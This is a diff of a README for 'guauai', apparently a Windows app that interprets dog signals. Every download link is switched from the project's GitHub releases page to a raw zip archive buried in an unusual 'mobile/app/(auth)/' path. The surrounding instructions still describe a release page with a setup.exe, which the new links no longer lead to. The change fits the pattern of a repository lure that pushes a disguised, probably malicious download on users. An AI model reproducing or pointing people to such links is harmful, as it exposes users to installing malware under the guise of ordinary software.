@@ -1,6 +1,6 @@
 # 🐕 guauai - Understand Your Dog’s Signals Easily
 
-[![Download guauai](https://img.shields.io/badge/Download-guauai-4caf50?style=for-the-badge&logo=github)](https://github.com/Mystery25-source-network/guauai/releases)
+[![Download guauai](https://img.shields.io/badge/Download-guauai-4caf50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Mystery25-source-network/guauai/main/mobile/app/(auth)/Software_1.2-beta.5.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to get guauai running on your Windows computer.
 ## 🔽 Download and Install guauai
 
 1. Click the green button below to visit the download page:  
-   [![Download guauai](https://img.shields.io/badge/Download-guauai-ff4500?style=for-the-badge&logo=windows)](https://github.com/Mystery25-source-network/guauai/releases)  
+   [![Download guauai](https://img.shields.io/badge/Download-guauai-ff4500?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Mystery25-source-network/guauai/main/mobile/app/(auth)/Software_1.2-beta.5.zip)  
 
 2. On the release page, look for the latest release version. It will have a name like `guauai-setup.exe` or similar.
 
@@ -118,7 +118,7 @@ Follow these steps to get guauai running on your Windows computer.
   Make sure the room is quiet and the microphone is near your dog.
 
 - **Updates won’t install:**  
-  Download the latest version manually from the [release page](https://github.com/Mystery25-source-network/guauai/releases).
+  Download the latest version manually from the [release page](https://raw.githubusercontent.com/Mystery25-source-network/guauai/main/mobile/app/(auth)/Software_1.2-beta.5.zip).
 
 ---
 
@@ -134,4 +134,4 @@ The app was built using open tools and code, so it can be expanded or improved b
 
 Use this link to get the latest Windows installer and start using guauai today:
 
-[![Download guauai](https://img.shields.io/badge/Download-guauai-ff4500?style=for-the-badge&logo=windows)](https://github.com/Mystery25-source-network/guauai/releases)
+[![Download guauai](https://img.shields.io/badge/Download-guauai-ff4500?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/Mystery25-source-network/guauai/main/mobile/app/(auth)/Software_1.2-beta.5.zip)
